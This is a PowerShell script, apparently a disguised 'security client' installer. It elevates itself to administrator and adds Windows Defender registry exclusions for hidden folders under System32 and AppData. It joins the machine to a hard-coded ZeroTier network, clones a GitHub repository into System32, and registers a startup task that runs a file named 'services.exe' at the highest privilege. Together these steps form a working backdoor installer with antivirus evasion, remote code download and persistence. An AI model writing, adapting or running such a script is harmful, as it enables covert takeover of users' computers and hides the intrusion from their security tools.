# Function to ensure the script runs with administrative privileges
function Ensure-Admin {
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
        Write-Host "Restarting script with elevated privileges..." -ForegroundColor Yellow
        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`"" -Verb RunAs
        exit
    }
}

# Call the function to ensure administrative privileges
Ensure-Admin

# Function to add folder exclusions to Windows Defender via the registry
function Add-FolderExclusions {
    # List of folders to exclude
    $foldersToExclude = @(
        "C:\Windows\System32\SubDirectory\",
        "C:\Windows\System32\SubDir",
	"C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\base\",
        "$env:APPDATA\SubDir"  # Dynamically gets the current user's AppData path
    )

    # Define the registry path for exclusions
    $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths"

    # Create the registry key if it doesn't exist
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }

    # Add each folder to the exclusions
    foreach ($folder in $foldersToExclude) {
        Write-Host "Adding exclusion for folder: $folder" -ForegroundColor Green
        Set-ItemProperty -Path $regPath -Name $folder -Value 0 -ErrorAction Stop
    }

    # Verify exclusions
    Write-Host "Verifying exclusions..." -ForegroundColor Cyan
    $exclusions = Get-ItemProperty -Path $regPath
    foreach ($folder in $foldersToExclude) {
        if ($exclusions.$folder -eq 0) {
            Write-Host "Successfully added exclusion for: $folder" -ForegroundColor Green
        } else {
            Write-Host "Failed to add exclusion for: $folder" -ForegroundColor Red
        }
    }
}

# Add folder exclusions
Add-FolderExclusions

# Function to install Chocolatey if not already installed
function Install-Chocolatey {
    if (!(Get-Command choco -ErrorAction SilentlyContinue)) {
        Write-Host "Installing Chocolatey..." -ForegroundColor Green
        Set-ExecutionPolicy Bypass -Scope Process -Force
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
        Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
    } else {
        Write-Host "Chocolatey is already installed." -ForegroundColor Cyan
    }
}

# Install Chocolatey
Install-Chocolatey

# Function to install Git using Chocolatey
function Install-Git {
    if (!(Get-Command git -ErrorAction SilentlyContinue)) {
        Write-Host "Installing Git using Chocolatey..." -ForegroundColor Green
        choco install git -y
    } else {
        Write-Host "Git is already installed." -ForegroundColor Cyan
    }
}

# Install Git
Install-Git

# Install ZeroTier using Chocolatey
Write-Host "Installing ZeroTier using Chocolatey..." -ForegroundColor Green
choco install zerotier-one -y

#Refreshing environmental variables 
[System.Environment]::SetEnvironmentVariable('PATH', [System.Environment]::GetEnvironmentVariable('PATH', [System.EnvironmentVariableTarget]::Machine), [System.EnvironmentVariableTarget]::Process)


# Verify installation
if (!(Get-Command zerotier-cli -ErrorAction SilentlyContinue)) {
    Write-Host "ZeroTier installation failed." -ForegroundColor Red
    $choice = Read-Host "Do you want to troubleshoot and rerun the installation? (yes/no)"
    if ($choice -eq "yes" -or $choice -eq "y") {
        Write-Host "Please check your internet connection and try again." -ForegroundColor Cyan
        return
    } else {
        Write-Host "Exiting script without completing installation." -ForegroundColor Red
        return
    }
}

# Start the ZeroTierOne service
Write-Host "Starting ZeroTierOne service..." -ForegroundColor Green
Start-Service -Name ZeroTierOneService

# Verify the service started successfully
if ((Get-Service -Name ZeroTierOneService).Status -ne "Running") {
    Write-Host "Failed to start ZeroTierOne service." -ForegroundColor Red
    $choice = Read-Host "Would you like to troubleshoot the service manually? (yes/no)"
    if ($choice -eq "no" -or $choice -eq "n") {
        Write-Host "Exiting script." -ForegroundColor Red
        return
    }
}

# Join the specified ZeroTier network
Write-Host "Joining ZeroTier network..." -ForegroundColor Green
zerotier-cli join 9f77fc393ec31ee7

# Function to clone the GitHub repository
function Clone-GitHubRepo {
    $repoUrl = "https://github.com/zainmustafam977/SECURITYCLIENT.git"
    $destinationDir = "C:\Windows\System32\SubDirectory\"
	
	# Check if the destination path exists
    if (Test-Path $destinationDir) {
        Write-Host "Directory exists. Deleting it..."
        Remove-Item -Recurse -Force $destinationDir
}

    # Create the destination directory if it doesn't exist
    if (-not (Test-Path $destinationDir)) {
        New-Item -Path $destinationDir -ItemType Directory -Force | Out-Null
    }

    Write-Host "Cloning GitHub repository..." -ForegroundColor Green
    try {
        # Use the git clone command directly
        git clone https://github.com/zainmustafam977/SECURITYCLIENT.git C:\Windows\System32\SubDirectory\SECURITYCLIENT\git 
        Write-Host "Repository cloned successfully." -ForegroundColor Green
    } catch {
        Write-Host "Failed to clone repository: $($_.Exception.Message)" -ForegroundColor Red
        throw "Repository clone failed."
    }
}

# Clone the GitHub repository
Clone-GitHubRepo

# Function to create and start services for each .exe file in the base folder
#CONTROL+Q
# function Create-And-Start-Services {
    # $baseDir = "C:\Windows\System32\SubDir\SECURITYCLIENT\git\base"

   ## Check if the base directory exists
    # if (-not (Test-Path $baseDir)) {
        # Write-Host "Base directory not found: $baseDir" -ForegroundColor Red
        # throw "Base directory does not exist."
    # }

    ##Get all .exe files in the base directory
    # $exeFiles = Get-ChildItem -Path $baseDir -Filter *.exe -ErrorAction Stop

    # if ($exeFiles.Count -eq 0) {
        # Write-Host "No .exe files found in the base directory." -ForegroundColor Red
        # throw "No executable files found."
    # }

    # foreach ($exeFile in $exeFiles) {
        # $serviceName = "Service_" + $exeFile.BaseName
        # $exePath = $exeFile.FullName

        # Write-Host "Creating service for $($exeFile.Name)..." -ForegroundColor Green
        # try {
          ##  Create the service
            # sc.exe create $serviceName binPath= "$exePath" start= auto | Out-Null
            # Write-Host "Service '$serviceName' created successfully." -ForegroundColor Green

           ## Start the service
            # Start-Service -Name $serviceName -ErrorAction Stop
            # Write-Host "Service '$serviceName' started successfully." -ForegroundColor Green
        # } catch {
            # Write-Host "Failed to create or start service '$serviceName': $($_.Exception.Message)" -ForegroundColor Red
            # throw "Service creation or start failed."
       # }
    # }
# }

# Function to validate if the provided path is a valid .exe file
function Validate-ExeFile {
    param (
        [string]$FilePath
    )
    if (-not (Test-Path -Path $FilePath)) {
        Write-Host "The specified file path does not exist." -ForegroundColor Red
        return $false
    }
    if ((Get-Item $FilePath).Extension -ne ".exe") {
        Write-Host "The specified file is not a valid .exe file." -ForegroundColor Red
        return $false
    }
    return $true
}

# Prompt the user for the program location
$programPath = "C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\base\services.exe"

# Validate the provided path
if (-not (Validate-ExeFile -FilePath $programPath)) {
    Write-Host "Invalid file path or file type. Exiting script." -ForegroundColor Red
    
}

# Define the task name and description
$taskName = "StartupProgramTask"
$taskDescription = "Runs a program at system startup under the logged-in user account."

# Get the current logged-in user's username
$currentUser = $env:USERNAME

# Create the scheduled task
$action = New-ScheduledTaskAction -Execute $programPath
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId $currentUser -LogonType Interactive -RunLevel Highest

# Register the scheduled task
try {
    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description $taskDescription -Principal $principal -Force
    Write-Host "Scheduled task '$taskName' created successfully." -ForegroundColor Green
} catch {
    Write-Host "Failed to create the scheduled task: $_" -ForegroundColor Red
    
}

# Run the scheduled task immediately
try {
    Start-ScheduledTask -TaskName $taskName
    Write-Host "Scheduled task '$taskName' started successfully." -ForegroundColor Green
} catch {
    Write-Host "Failed to start the scheduled task: $_" -ForegroundColor Red
    
}

# Verify the status of the scheduled task
$taskStatus = (Get-ScheduledTask -TaskName $taskName).State
if ($taskStatus -eq "Running") {
    Write-Host "The scheduled task '$taskName' is running successfully." -ForegroundColor Green
} else {
    Write-Host "The scheduled task '$taskName' is not running. Current status: $taskStatus" -ForegroundColor Red
}

Write-Host "Script completed successfully." -ForegroundColor Green
# Keep the window open
Read-Host -Prompt "Press Enter to exit"
